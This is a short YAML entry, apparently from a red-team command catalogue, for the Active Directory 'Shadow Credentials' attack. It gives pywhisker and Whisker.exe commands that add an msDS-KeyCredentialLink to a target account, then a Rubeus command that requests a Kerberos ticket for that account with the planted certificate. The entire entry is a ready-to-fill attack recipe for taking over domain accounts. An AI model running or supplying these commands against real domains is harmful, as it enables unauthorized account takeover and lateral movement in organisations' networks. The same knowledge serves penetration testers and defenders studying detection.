name: ShadowCredentials
description: Add msDS-KeyCredentialLink for certificate-based auth
commands:
- '# pywhisker'
- pywhisker.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --target '<TARGET>' --action add
- ''
- '# Whisker (C#)'
- Whisker.exe add /target:<TARGET>
- ''
- '# Authenticate with certificate'
- Rubeus.exe asktgt /user:<TARGET> /certificate:<PFX> /password:<PFX_PASS> /nowrap
opsec: []
references: []
